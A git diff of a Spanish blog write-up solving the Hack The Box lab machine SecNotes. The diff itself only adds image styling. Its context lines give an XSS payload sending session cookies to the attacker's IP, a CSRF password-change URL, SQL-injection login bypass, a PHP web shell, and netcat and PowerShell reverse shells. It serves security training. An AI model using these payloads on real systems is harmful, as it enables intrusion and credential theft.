@@ -7,7 +7,7 @@ lang: es
 
 En esta ocasión vamos a estar resolviendo la máquina _SecNotes_ de _Hack The Box_. Es una máquina _Windows_ de nivel de dificultad medio en la intrusión, y medio en la escalada de privilegios según figura en la plataforma.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/1.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/1.png){:class="blog-image" onclick="expandImage(this)"} 
 
 ### [](#header-3)Fase De Reconocimiento
 
@@ -17,7 +17,7 @@ Primeramente vamos a lanzar una _traza ICMP_ para saber si la máquina está act
 ping -c 1 10.10.10.97
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/2.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/2.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del _TTL_; en este caso el valor del _TTL_ de la máquina es `127`, por lo que podemos intuir que estamos ante una máquina _Windows_. Recordemos que algunos de los valores referenciales son los siguientes:
 
@@ -33,7 +33,7 @@ Si nos damos cuenta, en esta ocasión, el valor del _TTL_ es `127` y no `128` co
 ping -c 1 10.10.10.97 -R
 ``` 
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/3.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/3.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Posteriormente, vamos a utilizar la herramienta _Nmap_ para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:
 
@@ -89,19 +89,19 @@ whatweb http://10.10.10.97
 whatweb http://10.10.10.97:8808
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/4.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/4.png){:class="blog-image" onclick="expandImage(this)"} 
 
 No hay nada que llame especialmente nuestra atención, más que el redireccionamiento que realiza la primera página hacia lo que parece ser un panel de login, y el título de la segunda página web que es el que viene por defecto al montarla con `IIS`.
 
 En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/5.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/5.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Lo primero que nos puede venir a la mente al ver un panel de login, sería probar credenciales por defecto, sin embargo este no va a ser el caso.
 
 Algo interesante que voy a comentar solo como curiosidad, es que si ingresamos un nombre de usuario que no existe en el sistema, la página nos devolverá el siguiente mensaje.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/6.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/6.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Algo que resulta crítico, ya que teniendo control sobre este mensaje, podemos aplicar fuerza bruta sobre el campo `Username` para descubrir usuarios válidos.
 
@@ -130,7 +130,7 @@ wfuzz -c -L -t 400 --hs "No account found with that username." -w /dirección/de
 
 En caso de que aplicasemos fuerza bruta sobre este campo, descubriríamos que el usuario `tyler` existe dentro del sistema, por lo que ahora tendríamos que aplicar fuerza bruta sobre el campo `Password`, para lo cual ya no tendremos tanta suerte, ya que como veremos más adelante, su contraseña es bastante robusta, por lo que no es suceptible a ataques por diccionario.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/7.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/7.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Respecto a la segunda página no hay prácticamente nada que podamos hacer, por el momento, al menos.
 
@@ -142,17 +142,17 @@ La máquina _SecNotes_ cuenta con dos vías potenciales para realizar la intrusi
 
 En vista de que las credenciales por defecto no funcionaron, podemos hacer lo que haría un usuario normal, registrarnos, no todo se trata de romper.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/8.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/8.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Una vez hemos creado una cuenta, podemos logearnos, y veremos un panel bastante sencillo, pero donde destaca un nombre, `tyler`, un posible usuario potencial, que como mencioné antes, podíamos haberlo descubierto por fuerza bruta.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/9.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/9.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Por otra parte, vemos que la página nos permite crear una serie de notas, hagámoslo.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/10.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/10.png){:class="blog-image" onclick="expandImage(this)"} 
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/11.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/11.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Vemos que el mecanismo de la página es bastante simple, pero si durante el desarrollo de la misma, no se tuvo en consideración ningún tipo de seguridad, quizá esta sea vulnerable a algo tan básico como confiar plenamente en el input del usuario.
 
@@ -166,7 +166,7 @@ En el campo _Title_ podemos escribir cualquier cosa, aunque perfectamente podrí
 
 De este modo el texto que introduzcamos cambiará su formato al de _header 1_.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/12.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/12.png){:class="blog-image" onclick="expandImage(this)"} 
 
 O por ejemplo, podemos hacer que nuestro texto se desplace:
 
@@ -174,7 +174,7 @@ O por ejemplo, podemos hacer que nuestro texto se desplace:
 <marquee>Una frase cualquiera</marquee>
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/13.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/13.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Vemos que como atacantes, tenemos la capacidad de inyectar código al propio código fuente de la página web. ¿Qué tal si probamos ahora un [XSS](https://mateonitro550.github.io/https://mateonitro550.github.io/Cross-Site-Scripting-(XSS)) (Cross-Site Scripting)?
 
@@ -186,7 +186,7 @@ Igual que antes, en el campo _Title_ podemos escribir cualquier cosa, y en el ca
 
 Podemos observar que cada vez que la página web se recarga, aparece un mensaje con el texto que indicamos anteriormente.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/14.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/14.png){:class="blog-image" onclick="expandImage(this)"} 
 
 ¿Qué tal si en vez de mostrar por pantalla una frase cualquiera, listamos mejor información relevante como la cookie de sesión?
 
@@ -194,7 +194,7 @@ Podemos observar que cada vez que la página web se recarga, aparece un mensaje 
 <script>alert(document.cookie)</script>
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/15.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/15.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Una vez comprobamos que tenemos la capacidad de visualizar nuestra propia cookie de sesión a través de ventanas emergentes (pop-ups), podemos empezar a esbozar una posible vía potencial para la intrusión.
 
@@ -214,7 +214,7 @@ A continuación, crearemos una nota con el siguiente mensaje:
 <script>document.write('<img src="http://nuestraDirecciónIP:80/cookie=' + document.cookie + '">')</script>
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/16.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/16.png){:class="blog-image" onclick="expandImage(this)"} 
 
 En vista de que recibimos nuestra propia cookie de sesión directamente en nuestro equipo, sería solo cuestión de tiempo para hacernos con las cookies de otros usuarios, si los existiera, claro está.
 
@@ -228,7 +228,7 @@ Sin cerrar nuestro servidor hosteado con `Python`, a través del botón _Contact
 http://nuestraDirecciónIP:80/tylerEstáPresente
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/17.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/17.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Vemos que conseguimos una petición por GET por parte de la máquina víctima, por lo que asumimos que este lee nuestros mensajes. Ya con esto podemos pensar que tenemos una posible vía potencial para hacernos con la cookie del usuario. Por lo cual, enviaremos el siguiente mensaje:
 
@@ -236,37 +236,37 @@ Vemos que conseguimos una petición por GET por parte de la máquina víctima, p
 <script>document.write('<img src="http://nuestraDirecciónIP:80/cookie=' + document.cookie + '">')</script>
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/18.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/18.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Para nuestra sorpresa, esto no funciona, así que tendremos que buscar otra alternativa.
 
 Investigando un poco más la página web, si decidimos cambiar nuestra contraseña, nos daremos cuenta que la página no nos solicita nuestra contraseña anterior, o algún otro método de verificación en dos pasos.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/19.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/19.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Adicionalmente, si revisamos esta petición con `Burp Suite`, nos daremos cuenta que no existe algún tipo de [CSRF Token](https://portswigger.net/web-security/csrf/tokens), por lo que en principio, podríamos modificar esta petición a nuestro antojo.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/20.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/20.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Lo que haremos será cambiar esta petición que se está tramitando por POST, a GET. De modo que no haya que proporcionar los campos `Password` y `Confirm Password` de forma manual, los proporcionaremos a través de la propia URL.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/21.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/21.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Para ello, desde `Burp Suite`, habiendo capturado la petición del cambio de contraseña, simplemente haremos _click derecho_, _Change request method_, y copiaremos la nueva petición por GET.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/22.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/22.png){:class="blog-image" onclick="expandImage(this)"} 
 
 De esta manera, si añadimos _http://10.10.10.97_ al inicio de la petición que acabamos de copiar, generaremos un URL capaz de cambiar contraseñas a través del método GET; probémoslo.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/23.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/23.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Posteriormente, proseguiremos a logearnos con la contraseña que establecimos en el URL.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/24.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/24.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Ya una vez dentro, encontraremos una nota, con lo que parece ser un usuario y contraseña para un recurso compartido; si recordamos de nuestro escaneo con _Nmap_, el puerto `445` estaba abierto.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/25.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/25.png){:class="blog-image" onclick="expandImage(this)"} 
 
 ### [](#header-3)SQL Injection
 
@@ -274,11 +274,11 @@ Otro vector a considerar al encontrarnos frente a un panel de login sería proba
 
 Al igual que cuando aplicamos fuerza bruta sobre el campo `Username`, podemos ayudarnos de un diccionario como el mismo [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/sqli.auth.bypass.txt), el cual contiene una buena cantidad de expresiones que podemos probar.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/26.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/26.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Habiendo bypasseado el panel de login llegaremos igualmente a las credenciales del recurso compartido a nivel de red, con la diferencia que tenemos acceso a las notas de todos los usuarios, no únicamente `tyler`.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/27.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/27.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Independientemente de como nos hayamos hecho con las credenciales, podemos empezar a analizar el recurso con `SMBMap`.
 
@@ -286,7 +286,7 @@ Independientemente de como nos hayamos hecho con las credenciales, podemos empez
 smbmap -H 10.10.10.97 -u 'tyler' -p '92g!mA8BGj0irkL%0G*&'
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/28.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/28.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Podemos observar que tenemos permiso de lectura y escritura sobre el recurso `new-site`, echemos un vistazo de manera recursiva sobre este.
 
@@ -294,7 +294,7 @@ Podemos observar que tenemos permiso de lectura y escritura sobre el recurso `ne
 smbmap -H 10.10.10.97 -u 'tyler' -p '92g!mA8BGj0irkL%0G*&' -R 'new-site'
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/29.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/29.png){:class="blog-image" onclick="expandImage(this)"} 
 
 A partir de este punto empezaremos a trabajar con `smbclient`, ya que nos resultará mucho más cómoda su interfaz de línea de comandos (CLI).
 
@@ -309,7 +309,7 @@ get iisstart.htm
 get iisstart.png
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/30.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/30.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Rápidamente nos daremos cuenta que estamos frente al contenido de la segunda página web, alojada en el puerto `8808`; por lo que, dada nuestra capacidad de escritura sobre el recurso, deberíamos de poder subir contenido que se vea reflejado en el servidor web.
 
@@ -325,17 +325,17 @@ Empecemos por subir algo simple como una `web shell`.
 put cmd.php
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/31.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/31.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Una vez subida, desde nuestro navegador, podemos acceder a ella añadiendo _/cmd.php?cmd=comando_ al url.
 
 Podemos ejecutar _ipconfig_ para corroborar que nos encontramos dentro de la máquina víctima.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/32.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/32.png){:class="blog-image" onclick="expandImage(this)"} 
 
 O _whoami_ para determinar que usuario somos.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/33.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/33.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Ya a partir de este punto, lo que nos interesa como atacantes, es ganar acceso al sistema a través de una consola propiamente, para lo cual tenemos dos opciones:
 
@@ -345,7 +345,7 @@ Podemos usar [Netcat](https://eternallybored.org/misc/netcat/), para lo cual des
 put nc64.exe
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/34.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/34.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Nos pondremos en escucha a través del puerto que determinemos.
 
@@ -359,7 +359,7 @@ Para finalmente a través del navegador añadir lo siguiente al url.
 /cmd.php?cmd=nc64.exe -e cmd <nuestraDirecciónIP> <puertoCualquiera>
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/35.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/35.png){:class="blog-image" onclick="expandImage(this)"} 
 
 O por su parte podemos usar `Invoke-PowerShellTcp` de _nishang_, para lo cual descargaremos el script.
 
@@ -379,7 +379,7 @@ Lo subimos al servidor web.
 put Invoke-PowerShellTcp.ps1
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/36.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/36.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Nos ponemos en escucha a través del puerto que determinamos anteriormente.
 
@@ -393,23 +393,23 @@ Para finalmente a través del navegador añadir lo siguiente al url.
 /cmd.php?cmd=powershell -ep bypass .\Invoke-PowerShellTcp
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/37.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/37.png){:class="blog-image" onclick="expandImage(this)"} 
 
 ### [](#header-3)Escalada De Privilegios
 
 Si empezamos a enumerar el sistema, nos daremos cuenta que dentro del _Disco Local C_ existe un archivo `Ubuntu.zip` así como una carpeta que lleva por nombre `Distros`, interesante.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/38.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/38.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Si volvemos a revisar dentro del directorio del usuario `tyler` encontraremos un acceso directo a lo que parece ser una `bash`, echémosle un vistazo.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/39.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/39.png){:class="blog-image" onclick="expandImage(this)"} 
 
 ```
 type bash.lnk
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/40.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/40.png){:class="blog-image" onclick="expandImage(this)"} 
 
 De lo poco que es legible, podemos observar que tenemos en el sistema una _bash_, ubicada en la ruta _C:\Windows\System32_.
 
@@ -419,11 +419,11 @@ Podemos corroborar esto si listamos el directorio _C:\Users\tyler\AppData\Local\
 
 Tal y como encontramos inicialmente, nos hallamos frente a un subsistema `Ubuntu`.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/41.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/41.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Veamos si encontramos algo dentro del _WSL_, para ello podemos abrir la _bash_ bien desde el acceso directo o su ruta absoluta.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/42.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/42.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Podemos ver que directamente somos el usuario _root_ por lo que en principio tenemos máximos privilegios. Además, podemos observar que nos encontramos en la ruta _/mnt/c/Users/tyler/Desktop_.
 
@@ -432,7 +432,7 @@ whoami
 pwd
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/43.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/43.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Por lo que, deberíamos poder movernos a través de los disintos directorios de los demás usuarios.
 
@@ -442,7 +442,7 @@ ls /mnt/c/Users
 
 Sin embargo, al querer acceder al directorio del usuario _Administrator_ salta un error, por lo que, la solución no es por aquí.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/44.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/44.png){:class="blog-image" onclick="expandImage(this)"} 
 
 Si nos dirigimos a nuestro directorio como usuario _root_, encontraremos el archivo `.bash_history`, nuestro histórico de comandos.
 
@@ -466,4 +466,4 @@ O, simplemente, haciendo uso de `impacket-psexec`.
 rlwrap impacket-psexec administrator@10.10.10.97
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/45.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/45.png){:class="blog-image" onclick="expandImage(this)"} 
